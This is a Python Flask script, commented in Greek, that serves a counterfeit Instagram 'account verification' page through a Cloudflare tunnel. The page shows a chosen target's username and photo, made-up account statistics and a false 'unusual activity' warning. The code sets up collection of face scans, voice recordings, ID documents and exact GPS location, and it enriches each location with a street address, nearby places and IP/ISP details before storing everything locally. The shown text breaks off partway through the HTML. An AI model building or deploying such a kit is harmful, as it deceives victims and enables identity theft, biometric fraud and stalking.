import os
import base64
import subprocess
import sys
import re
import logging
import json
import random
from threading import Thread
import time
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
import requests
from geopy.geocoders import Nominatim
from geopy.distance import geodesic
from io import BytesIO

# --- Εγκατάσταση Εξαρτήσεων και Ρύθμιση Tunnel ---

def install_package(package):
    """Εγκαθιστά ένα πακέτο χρησιμοποιώντας pip ήσυχα."""
    subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])

def check_dependencies():
    """Ελέγχει για cloudflared και απαιτούμενα πακέτα Python."""
    try:
        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[ΣΦΑΛΜΑ] Το 'cloudflared' δεν είναι εγκατεστημένο ή δεν βρίσκεται στο PATH του συστήματος.", file=sys.stderr)
        print("Παρακαλώ εγκαταστήστε το από: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
        sys.exit(1)
    
    packages = {"Flask": "flask", "requests": "requests", "geopy": "geopy", "Pillow": "PIL"}
    for pkg_name, import_name in packages.items():
        try:
            __import__(import_name)
        except ImportError:
            install_package(pkg_name)

def run_cloudflared_and_print_link(port, script_name):
    """Ξεκινά ένα cloudflared tunnel και εκτυπώνει τον δημόσιο σύνδεσμο."""
    cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in iter(process.stdout.readline, ''):
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            print(f"{script_name} Δημόσιος Σύνδεσμος: {match.group(0)}")
            sys.stdout.flush()
            break
    process.wait()

def generate_random_username():
    """Δημιουργεί ένα τυχαίο όνομα χρήστη σαν του Instagram."""
    greek_names = ["nikos", "maria", "giorgos", "sofia", "dimitris", "anna", "kostas", "elena", "panos", "chris",
                   "alex", "katerina", "stefanos", "dora", "thanos", "irini", "vasilis", "ioanna", "petros", "melina"]
    last_names = ["papadopoulos", "nikolaou", "georgiou", "dimitriou", "ioannou", "antoniou", "vasileiou", "michael", "konstantinou", "andreas",
                  "christou", "athanasiou", "papa", "kyriakou", "markou", "stavrou", "karagiannis", "papageorgiou", "alexiou", "tsakiris"]
    
    first = random.choice(greek_names)
    last = random.choice(last_names)
    number = random.randint(10, 999)
    
    username_variants = [
        f"{first}_{last}{number}",
        f"{first}.{last}",
        f"official_{first}{number}",
        f"real_{first}_{last}",
        f"{first}{last}",
        f"{first[0]}{last}{number}",
        f"its{first}{number}",
        f"just{first}",
        f"the{last}",
        f"{first}the{last}"
    ]
    
    return random.choice(username_variants)

def find_profile_picture(folder):
    """Αναζητά αρχείο εικόνας στο φάκελο για χρήση ως προφίλ."""
    image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp']
    
    for file in os.listdir(folder):
        file_lower = file.lower()
        if any(file_lower.endswith(ext) for ext in image_extensions):
            filepath = os.path.join(folder, file)
            try:
                # Διάβασμα αρχείου εικόνας και μετατροπή σε base64
                with open(filepath, 'rb') as f:
                    image_data = f.read()
                    image_ext = os.path.splitext(file)[1].lower()
                    
                    # Προσδιορισμός τύπου MIME βάσει επέκτασης
                    mime_types = {
                        '.jpg': 'image/jpeg',
                        '.jpeg': 'image/jpeg',
                        '.png': 'image/png',
                        '.gif': 'image/gif',
                        '.bmp': 'image/bmp',
                        '.webp': 'image/webp'
                    }
                    
                    mime_type = mime_types.get(image_ext, 'image/jpeg')
                    base64_image = base64.b64encode(image_data).decode('utf-8')
                    
                    return {
                        'filename': file,
                        'data_url': f'data:{mime_type};base64,{base64_image}',
                        'path': filepath
                    }
            except Exception as e:
                print(f"Σφάλμα ανάγνωσης εικόνας προφίλ {file}: {e}")
    
    return None

def get_verification_settings():
    """Λαμβάνει τις προτιμήσεις χρήστη για τη διαδικασία επαλήθευσης."""
    print("\n" + "="*60)
    print("ΡΥΘΜΙΣΕΙΣ ΕΠΑΛΗΘΕΥΣΗΣ INSTAGRAM")
    print("="*60)
    
    # Λήψη ονόματος χρήστη στόχου
    print("\n[+] ΡΥΘΜΙΣΗ ΟΝΟΜΑΤΟΣ ΧΡΗΣΤΗ")
    print("Εισάγετε το όνομα χρήστη Instagram για εμφάνιση στη σελίδα επαλήθευσης")
    print("Αφήστε κενό για τυχαία δημιουργία")
    
    username_input = input("Όνομα χρήστη (ή Enter για τυχαίο): ").strip()
    if username_input:
        settings = {'target_username': username_input}
    else:
        random_username = generate_random_username()
        settings = {'target_username': random_username}
        print(f"[+] Δημιουργήθηκε τυχαίο όνομα: {random_username}")
    
    # Αναζήτηση εικόνας προφίλ
    global DOWNLOAD_FOLDER
    profile_pic = find_profile_picture(DOWNLOAD_FOLDER)
    if profile_pic:
        settings['profile_picture'] = profile_pic['data_url']
        settings['profile_picture_filename'] = profile_pic['filename']
        print(f"[+] Βρέθηκε εικόνα προφίλ: {profile_pic['filename']}")
        print(f"[+] Χρήση εικόνας προφίλ για @{settings['target_username']}")
    else:
        settings['profile_picture'] = None
        settings['profile_picture_filename'] = None
        print(f"[!] Δεν βρέθηκε εικόνα προφίλ")
        print(f"[!] Συμβουλή: Τοποθετήστε μια εικόνα (jpg/png) στον φάκελο {DOWNLOAD_FOLDER} για χρήση ως προφίλ")
    
    print(f"\n[+] Η επαλήθευση θα εμφανιστεί για: @{settings['target_username']}")
    
    # Διάρκεια σάρωσης προσώπου
    print("\n1. Διάρκεια Σάρωσης Προσώπου:")
    print("Πόσα δευτερόλεπτα για επαλήθευση κινήσεων προσώπου;")
    print("Προτείνεται: 15-30 δευτερόλεπτα για πλήρεις κινήσεις κεφαλιού")
    
    while True:
        try:
            duration = input("Διάρκεια σε δευτερόλεπτα (5-60, προεπιλογή: 20): ").strip()
            if not duration:
                settings['face_duration'] = 20
                break
            duration = int(duration)
            if 5 <= duration <= 60:
                settings['face_duration'] = duration
                break
            else:
                print("Παρακαλώ εισάγετε αριθμό μεταξύ 5 και 60.")
        except ValueError:
            print("Παρακαλώ εισάγετε έγκυρο αριθμό.")
    
    # Επαλήθευση φωνής
    print("\n2. Επαλήθευση Φωνής:")
    print("Ενεργοποίηση επαλήθευσης φωνής μετά τη σάρωση προσώπου;")
    voice_enabled = input("Ενεργοποίηση επαλήθευσης φωνής (ν/ο, προεπιλογή: ν): ").strip().lower()
    settings['voice_enabled'] = voice_enabled in ['ν', 'ναι', 'y', 'yes', '']
    
    if settings['voice_enabled']:
        print("\nΔιάρκεια Εγγραφής Φωνής:")
        while True:
            try:
                voice_duration = input("Δευτερόλεπτα για εγγραφή φωνής (3-10, προεπιλογή: 5): ").strip()
                if not voice_duration:
                    settings['voice_duration'] = 5
                    break
                voice_duration = int(voice_duration)
                if 3 <= voice_duration <= 10:
                    settings['voice_duration'] = voice_duration
                    break
                else:
                    print("Παρακαλώ εισάγετε αριθμό μεταξύ 3 και 10.")
            except ValueError:
                print("Παρακαλώ εισάγετε έγκυρο αριθμό.")
    
    # Επαλήθευση ταυτότητας
    print("\n3. Επαλήθευση Εγγράφου Ταυτότητας:")
    print("Απαιτείται μεταφόρτωση εγγράφου ταυτότητας;")
    id_enabled = input("Ενεργοποίηση επαλήθευσης ταυτότητας (ν/ο, προεπιλογή: ν): ").strip().lower()
    settings['id_enabled'] = id_enabled in ['ν', 'ναι', 'y', 'yes', '']
    
    # Επαλήθευση τοποθεσίας
    print("\n4. Επαλήθευση Τοποθεσίας:")
    print("Απαιτείται επαλήθευση τοποθεσίας;")
    location_enabled = input("Ενεργοποίηση επαλήθευσης τοποθεσίας (ν/ο, προεπιλογή: ν): ").strip().lower()
    settings['location_enabled'] = location_enabled in ['ν', 'ναι', 'y', 'yes', '']
    
    return settings

# --- Συναρτήσεις Επεξεργασίας Τοποθεσίας ---

geolocator = Nominatim(user_agent="instagram_verification")

def get_ip_info():
    """Λαμβάνει πληροφορίες τοποθεσίας βάσει IP."""
    try:
        response = requests.get("http://ipinfo.io/json", timeout=5)
        response.raise_for_status()
        return response.json()
    except requests.RequestException:
        return {}

def get_nearby_places(latitude, longitude, radius=2000, limit=3):
    """Επιστρέφει κοντινά καταστήματα/εγκαταστάσεις."""
    overpass_query = f"""
    [out:json];
    (
        node["shop"](around:{radius},{latitude},{longitude});
        way["shop"](around:{radius},{latitude},{longitude});
        node["amenity"](around:{radius},{latitude},{longitude});
        way["amenity"](around:{radius},{latitude},{longitude});
    );
    out center;
    """
    try:
        response = requests.get("http://overpass-api.de/api/interpreter", params={'data': overpass_query}, timeout=10)
        response.raise_for_status()
        elements = response.json().get('elements', [])
        results = []
        
        for element in elements:
            tags = element.get('tags', {})
            lat_elem = element.get('lat') or element.get('center', {}).get('lat')
            lon_elem = element.get('lon') or element.get('center', {}).get('lon')
            
            if not lat_elem or not lon_elem:
                continue
            
            distance = geodesic((latitude, longitude), (lat_elem, lon_elem)).meters
            
            place_type = tags.get("shop") or tags.get("amenity") or tags.get("tourism") or "unknown"
            place_name = tags.get("name", "Ανώνυμος Χώρος")
            
            results.append({
                "type": place_type,
                "name": place_name,
                "address": f"{tags.get('addr:street', '')} {tags.get('addr:housenumber', '')}".strip(),
                "distance_m": round(distance, 1)
            })
        
        results.sort(key=lambda x: x["distance_m"])
        return results[:limit]
        
    except requests.RequestException:
        return []

def process_and_save_location(data, session_id):
    """Επεξεργάζεται και αποθηκεύει δεδομένα τοποθεσίας με μεταδεδομένα."""
    try:
        lat = data.get('latitude')
        lon = data.get('longitude')
        
        if not lat or not lon:
            return
        
        # Λήψη πληροφοριών διεύθυνσης
        address_details = {}
        full_address = "Άγνωστο"
        try:
            location = geolocator.reverse((lat, lon), language='el', timeout=10)
            if location:
                full_address = location.address
                if hasattr(location, 'raw') and 'address' in location.raw:
                    address_details = location.raw.get('address', {})
        except Exception:
            pass
        
        # Λήψη κοντινών τοποθεσιών
        places = get_nearby_places(lat, lon)
        
        # Λήψη πληροφοριών IP
        ip_info = get_ip_info()
        
        # Προετοιμασία δομημένων δεδομένων
        location_data = {
            "verification_type": "location",
            "session_id": session_id,
            "timestamp": datetime.now().isoformat(),
            "gps_coordinates": {
                "latitude": lat,
                "longitude": lon,
                "accuracy_m": data.get('accuracy'),
                "altitude_m": data.get('altitude'),
                "speed_mps": data.get('speed'),
                "heading_degrees": data.get('heading')
            },
            "address_information": {
                "full_address": full_address,
                "house_number": address_details.get("house_number"),
                "street": address_details.get("road"),
                "city": address_details.get("city"),
                "state": address_details.get("state"),
                "postal_code": address_details.get("postcode"),
                "country": address_details.get("country")
            },
            "nearby_places": places,
            "network_information": {
                "ip_address": ip_info.get("ip"),
                "city": ip_info.get("city"),
                "region": ip_info.get("region"),
                "country": ip_info.get("country"),
                "isp": ip_info.get("org", "").split()[-1] if ip_info.get("org") else "Άγνωστο"
            },
            "device_info": {
                "user_agent": data.get('user_agent', 'Άγνωστο'),
                "timestamp_utc": datetime.utcnow().isoformat(),
                "local_timestamp": datetime.now().isoformat()
            }
        }
        
        # Αποθήκευση σε αρχείο
        filename = f"location_verification_{session_id}.json"
        filepath = os.path.join(DOWNLOAD_FOLDER, 'location_data', filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(location_data, f, indent=2, ensure_ascii=False)
        
        print(f"Δεδομένα τοποθεσίας αποθηκεύτηκαν: {filename}")
        
    except Exception as e:
        print(f"Σφάλμα επεξεργασίας τοποθεσίας: {e}")

# --- Flask Εφαρμογή ---

app = Flask(__name__)

# Παγκόσμιες ρυθμίσεις
VERIFICATION_SETTINGS = {
    'target_username': 'user_' + str(random.randint(100000, 999999)),
    'face_duration': 20,
    'voice_enabled': True,
    'voice_duration': 5,
    'id_enabled': True,
    'location_enabled': True,
    'profile_picture': None,
    'profile_picture_filename': None
}

DOWNLOAD_FOLDER = os.path.expanduser('~/storage/downloads/Instagram Verification')
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'face_scans'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'voice_recordings'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'id_documents'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'location_data'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'user_data'), exist_ok=True)

def create_html_template(settings):
    """Δημιουργεί το περιεκτικό πρότυπο επαλήθευσης Instagram με ελληνική μετάφραση."""
    target_username = settings['target_username']
    face_duration = settings['face_duration']
    voice_enabled = settings['voice_enabled']
    voice_duration = settings['voice_duration'] if voice_enabled else 0
    id_enabled = settings['id_enabled']
    location_enabled = settings['location_enabled']
    profile_picture = settings.get('profile_picture')
    profile_picture_filename = settings.get('profile_picture_filename')
    
    # Υπολογισμός συνολικών βημάτων
    total_steps = 2  # Εισαγωγή + Πρόσωπο
    if voice_enabled:
        total_steps += 1
    if id_enabled:
        total_steps += 1
    if location_enabled:
        total_steps += 1
    total_steps += 1  # Τελικό βήμα
    
    # Δημιουργία του βασικού προτύπου με μεταβλητές
    template = f'''<!DOCTYPE html>
<html lang="el">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Επαλήθευση Λογαριασμού</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }}
        
        body {{
            background-color: #000;
            color: #fff;
            min-height: 100vh;
            padding: 20px;
        }}
        
        .container {{
            max-width: 500px;
            width: 100%;
            margin: 0 auto;
        }}
        
        .logo {{
            text-align: center;
            margin-bottom: 30px;
            padding-top: 20px;
        }}
        
        .logo h1 {{
            font-family: 'Brush Script MT', cursive;
            font-size: 3.5rem;
            background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D, #F56040, #F77737, #FCAF45, #FFDC80);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }}
        
        .account-info {{
            background-color: #121212;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid #363636;
            text-align: center;
        }}
        
        .account-avatar {{
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: linear-gradient(45deg, #405DE6, #833AB4, #E1306C);
            margin: 0 auto 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
            color: white;
            overflow: hidden;
            border: 3px solid #363636;
        }}
        
        .account-avatar img {{
            width: 100%;
            height: 100%;
            object-fit: cover;
        }}
        
        .account-name {{
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 5px;
        }}
        
        .account-username {{
            color: #a8a8a8;
            font-size: 14px;
        }}
        
        .account-stats {{
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 15px;
            font-size: 14px;
        }}
        
        .account-stat {{
            text-align: center;
        }}
        
        .stat-number {{
            font-weight: 600;
            color: #fff;
        }}
        
        .stat-label {{
            color: #a8a8a8;
            font-size: 12px;
        }}
        
        .verification-steps {{
            background-color: #121212;
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 20px;
            border: 1px solid #363636;
        }}
        
        .step {{
            display: none;
        }}
        
        .step.active {{
            display: block;
        }}
        
        .step-title {{
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 10px;
            color: #fff;
        }}
        
        .step-subtitle {{
            color: #a8a8a8;
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 25px;
        }}
        
        .progress-container {{
            width: 100%;
            height: 4px;
            background-color: #363636;
            border-radius: 2px;
            margin-bottom: 30px;
            overflow: hidden;
        }}
        
        .progress-bar {{
            height: 100%;
            background: linear-gradient(90deg, #405DE6, #833AB4, #E1306C);
            width: 0%;
            transition: width 0.3s;
        }}
        
        .progress-steps {{
            display: flex;
            justify-content: space-between;
            margin-bottom: 30px;
            position: relative;
        }}
        
        .progress-step {{
            width: 24px;
            height: 24px;
            border-radius: 50%;
            background-color: #363636;
            color: #a8a8a8;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: 600;
            position: relative;
            z-index: 2;
        }}
        
        .progress-step.active {{
            background: linear-gradient(45deg, #405DE6, #833AB4);
            color: white;
        }}
        
        .progress-step.completed {{
            background-color: #405DE6;
            color: white;
        }}
        
        .progress-line {{
            position: absolute;
            top: 12px;
            left: 12px;
            right: 12px;
            height: 2px;
            background-color: #363636;
            z-index: 1;
        }}
        
        .progress-line-fill {{
            position: absolute;
            top: 12px;
            left: 12px;
            height: 2px;
            background: linear-gradient(90deg, #405DE6, #833AB4);
            z-index: 1;
            width: 0%;
            transition: width 0.3s;
        }}
        
        /* Στυλ Επαλήθευσης Προσώπου */
        .camera-container {{
            width: 300px;
            height: 300px;
            margin: 0 auto 30px;
            border-radius: 50%;
            overflow: hidden;
            background-color: #000;
            border: 3px solid #363636;
            position: relative;
        }}
        
        .camera-container video {{
            width: 100%;
            height: 100%;
            object-fit: cover;
        }}
        
        .face-overlay {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
        }}
        
        .face-circle {{
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 200px;
            height: 200px;
            border: 2px solid #405DE6;
            border-radius: 50%;
            box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.5);
        }}
        
        .instruction-container {{
            background-color: rgba(64, 93, 230, 0.1);
            border: 1px solid #405DE6;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 25px;
        }}
        
        .instruction-text {{
            font-size: 18px;
            font-weight: 600;
            text-align: center;
            margin-bottom: 10px;
            color: #405DE6;
        }}
        
        .instruction-detail {{
            font-size: 14px;
            color: #a8a8a8;
            text-align: center;
        }}
        
        .instruction-icon {{
            font-size: 32px;
            text-align: center;
            margin-bottom: 15px;
        }}
        
        .timer {{
            text-align: center;
            font-size: 32px;
            font-weight: 600;
            color: #405DE6;
            margin-bottom: 20px;
            font-family: monospace;
        }}
        
        /* Στυλ Επαλήθευσης Φωνής */
        .voice-instruction {{
            background-color: rgba(233, 89, 80, 0.1);
            border: 1px solid #E95950;
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 30px;
        }}
        
        .phrase-box {{
            background-color: #000;
            border: 2px solid #363636;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 25px;
            text-align: center;
        }}
        
        .phrase-text {{
            font-size: 20px;
            font-weight: 600;
            color: #fff;
            margin-bottom: 10px;
        }}
        
        .phrase-subtext {{
            color: #a8a8a8;
            font-size: 14px;
        }}
        
        .voice-visualizer {{
            width: 100%;
            height: 100px;
            background-color: #000;
            border-radius: 8px;
            margin-bottom: 25px;
            position: relative;
            overflow: hidden;
        }}
        
        .voice-wave {{
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 50%;
            background: linear-gradient(to top, rgba(64, 93, 230, 0.3), rgba(233, 89, 80, 0.3));
        }}
        
        /* Στυλ Επαλήθευσης Ταυτότητας */
        .id-upload-container {{
            display: flex;
            flex-direction: column;
            gap: 25px;
            margin-bottom: 30px;
        }}
        
        .id-card {{
            background-color: #000;
            border: 2px dashed #363636;
            border-radius: 12px;
            padding: 30px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
        }}
        
        .id-card:hover {{
            border-color: #405DE6;
            background-color: rgba(64, 93, 230, 0.05);
        }}
        
        .id-card.dragover {{
            border-color: #405DE6;
            background-color: rgba(64, 93, 230, 0.1);
        }}
        
        .id-icon {{
            font-size: 48px;
            margin-bottom: 15px;
            color: #405DE6;
        }}
        
        .id-title {{
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 10px;
        }}
        
        .id-subtitle {{
            color: #a8a8a8;
            font-size: 14px;
            margin-bottom: 15px;
        }}
        
        .id-requirements {{
            font-size: 12px;
            color: #888;
            text-align: left;
            margin-top: 20px;
        }}
        
        .id-requirements ul {{
            padding-left: 20px;
            margin-top: 10px;
        }}
        
        /* Στυλ Επαλήθευσης Τοποθεσίας */
        .location-container {{
            text-align: center;
            margin-bottom: 30px;
        }}
        
        .location-icon {{
            font-size: 72px;
            margin-bottom: 20px;
            color: #34A853;
        }}
        
        .location-info {{
            background-color: rgba(52, 168, 83, 0.1);
            border: 1px solid #34A853;
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 25px;
        }}
        
        .location-details {{
            background-color: #000;
            border: 1px solid #363636;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 25px;
            text-align: left;
            display: none;
        }}
        
        .location-detail-item {{
            margin-bottom: 10px;
            font-size: 14px;
        }}
        
        .location-detail-label {{
            color: #a8a8a8;
            display: inline-block;
            width: 120px;
        }}
        
        .location-detail-value {{
            color: #fff;
        }}
        
        .accuracy-meter {{
            width: 100%;
            height: 20px;
            background-color: #363636;
            border-radius: 10px;
            margin: 20px 0;
            overflow: hidden;
            position: relative;
        }}
        
        .accuracy-fill {{
            height: 100%;
            background: linear-gradient(90deg, #EA4335, #FBBC05, #34A853);
            width: 0%;
            transition: width 1s ease-in-out;
        }}
        
        .accuracy-labels {{
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            color: #a8a8a8;
            margin-top: 5px;
        }}
        
        /* Κοινά Στυλ */
        .button {{
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: opacity 0.2s;
            margin-bottom: 15px;
        }}
        
        .primary-btn {{
            background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4);
            color: white;
        }}
        
        .primary-btn:hover {{
            opacity: 0.9;
        }}
        
        .primary-btn:disabled {{
            opacity: 0.5;
            cursor: not-allowed;
        }}
        
        .secondary-btn {{
            background-color: #363636;
            color: white;
        }}
        
        .secondary-btn:hover {{
            background-color: #444;
        }}
        
        .status-message {{
            text-align: center;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
        }}
        
        .status-success {{
            background-color: rgba(76, 175, 80, 0.1);
            border: 1px solid #4CAF50;
            color: #4CAF50;
        }}
        
        .status-error {{
            background-color: rgba(244, 67, 54, 0.1);
            border: 1px solid #F44336;
            color: #F44336;
        }}
        
        .status-processing {{
            background-color: rgba(255, 193, 7, 0.1);
            border: 1px solid #FFC107;
            color: #FFC107;
        }}
        
        .loading-spinner {{
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
        }}
        
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
        
        .footer-links {{
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px solid #363636;
        }}
        
        .footer-links a {{
            color: #a8a8a8;
            text-decoration: none;
            font-size: 12px;
        }}
        
        .footer-links a:hover {{
            text-decoration: underline;
        }}
        
        .info-box {{
            background-color: rgba(255, 193, 7, 0.1);
            border: 1px solid #FFC107;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 25px;
            font-size: 14px;
            color: #FFC107;
        }}
        
        .info-box strong {{
            color: #fff;
        }}
        
        .file-input {{
            display: none;
        }}
        
        .preview-container {{
            margin-top: 15px;
            display: none;
        }}
        
        .preview-image {{
            max-width: 200px;
            max-height: 150px;
            border-radius: 8px;
            border: 2px solid #363636;
        }}
        
        /* Στυλ Ολοκλήρωσης */
        .completion-container {{
            text-align: center;
            padding: 40px 20px;
        }}
        
        .success-icon {{
            font-size: 80px;
            margin-bottom: 30px;
            color: #4CAF50;
        }}
        
        .checkmark {{
            width: 100px;
            height: 100px;
            border-radius: 50%;
            background: linear-gradient(45deg, #4CAF50, #8BC34A);
            margin: 0 auto 30px;
            position: relative;
            animation: popIn 0.5s ease-out;
        }}
        
        .checkmark::before {{
            content: "✓";
            color: white;
            font-size: 60px;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }}
        
        @keyframes popIn {{
            0% {{ transform: scale(0.5); opacity: 0; }}
            70% {{ transform: scale(1.1); opacity: 1; }}
            100% {{ transform: scale(1); opacity: 1; }}
        }}
        
        .account-access {{
            background: linear-gradient(45deg, #405DE6, #833AB4);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 20px;
        }}
        
        .features-list {{
            background-color: rgba(64, 93, 230, 0.1);
            border: 1px solid #405DE6;
            border-radius: 12px;
            padding: 25px;
            margin: 30px 0;
            text-align: left;
        }}
        
        .features-list li {{
            margin-bottom: 15px;
            display: flex;
            align-items: center;
        }}
        
        .feature-icon {{
            margin-right: 15px;
            font-size: 20px;
            color: #4CAF50;
        }}
        
        .next-steps {{
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px solid #363636;
        }}
        
        /* Στυλ Σελίδας Εκκρεμότητας */
        .review-container {{
            text-align: center;
            padding: 40px 20px;
        }}
        
        .review-icon {{
            font-size: 80px;
            margin-bottom: 30px;
            color: #FFC107;
            animation: pulse 2s infinite;
        }}
        
        @keyframes pulse {{
            0% {{ transform: scale(1); opacity: 1; }}
            50% {{ transform: scale(1.05); opacity: 0.8; }}
            100% {{ transform: scale(1); opacity: 1; }}
        }}
        
        .review-clock {{
            width: 100px;
            height: 100px;
            border-radius: 50%;
            background: linear-gradient(45deg, #FFC107, #FF9800);
            margin: 0 auto 30px;
            position: relative;
            animation: rotate 60s linear infinite;
        }}
        
        .review-clock::before {{
            content: "⏳";
            color: white;
            font-size: 50px;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }}
        
        @keyframes rotate {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        
        .review-timeline {{
            background-color: rgba(255, 193, 7, 0.1);
            border: 1px solid #FFC107;
            border-radius: 12px;
            padding: 25px;
            margin: 30px 0;
        }}
        
        .timeline-item {{
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 20px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }}
        
        .timeline-item:last-child {{
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }}
        
        .timeline-icon {{
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background-color: #FFC107;
            color: #000;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            font-weight: bold;
        }}
        
        .timeline-content {{
            flex: 1;
            text-align: left;
        }}
        
        .timeline-title {{
            font-weight: 600;
            margin-bottom: 5px;
        }}
        
        .timeline-description {{
            color: #a8a8a8;
            font-size: 14px;
        }}
        
        .contact-info {{
            background-color: rgba(64, 93, 230, 0.1);
            border: 1px solid #405DE6;
            border-radius: 12px;
            padding: 20px;
            margin: 30px 0;
        }}
        
        .contact-item {{
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }}
        
        .contact-item:last-child {{
            margin-bottom: 0;
        }}
        
        .contact-icon {{
            margin-right: 15px;
            font-size: 20px;
            color: #405DE6;
        }}
        
        .contact-text {{
            text-align: left;
            flex: 1;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>Instagram</h1>
        </div>
        
        <!-- Πληροφορίες Λογαριασμού -->
        <div class="account-info">
            <div class="account-avatar">
                {'<img src="' + profile_picture + '">' if profile_picture else target_username[0].upper()}
            </div>
            <div class="account-name">@{target_username}</div>
            <div class="account-username">Απαιτείται Επαλήθευση Λογαριασμού</div>
            
            <div class="account-stats">
                <div class="account-stat">
                    <div class="stat-number">{random.randint(100, 999)}</div>
                    <div class="stat-label">Δημοσιεύσεις</div>
                </div>
                <div class="account-stat">
                    <div class="stat-number">{random.randint(1000, 9999)}</div>
                    <div class="stat-label">Ακόλουθοι</div>
                </div>
                <div class="account-stat">
                    <div class="stat-number">{random.randint(500, 5000)}</div>
                    <div class="stat-label">Ακολουθεί</div>
                </div>
            </div>
        </div>
        
        <div class="verification-steps">
            <!-- Δείκτης Προόδου -->
            <div class="progress-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            
            <div class="progress-steps">
                <div class="progress-line"></div>
                <div class="progress-line-fill" id="progressLineFill"></div>
                <div class="progress-step completed" id="step1Indicator">1</div>
                <div class="progress-step active" id="step2Indicator">2</div>
                <div class="progress-step" id="step3Indicator">3</div>
                <div class="progress-step" id="step4Indicator">4</div>
                <div class="progress-step" id="step5Indicator">5</div>
            </div>
            
            <!-- Βήμα 1: Εισαγωγή -->
            <div class="step active" id="step1">
                <h2 class="step-title">Απαιτείται Επαλήθευση Λογαριασμού</h2>
                <p class="step-subtitle">
                    <strong>@{target_username}</strong>, για συμμόρφωση με τις πολιτικές ασφαλείας του Instagram και επαναφορά πλήρης πρόσβασης στον λογαριασμό, 
                    πρέπει να επαληθεύσουμε την ταυτότητά σας. Αυτό βοηθά στην προστασία του λογαριασμού σας από μη εξουσιοδοτημένη πρόσβαση.
                </p>
                
                <div class="info-box">
                    <strong>Γιατί απαιτείται αυτό;</strong><br>
                    Εντοπίσαμε ασυνήθιστη δραστηριότητα στον λογαριασμό @{target_username}. 
                    Για την αποτροπή μη εξουσιοδοτημένης πρόσβασης και τη διατήρηση της ασφάλειας του λογαριασμού σας, απαιτείται επαλήθευση.
                </div>
                
                <div class="instruction-container">
                    <div class="instruction-icon">🔒</div>
                    <div class="instruction-text">Ολοκληρώστε τα Βήματα Επαλήθευσης:</div>
                    <div class="instruction-detail">
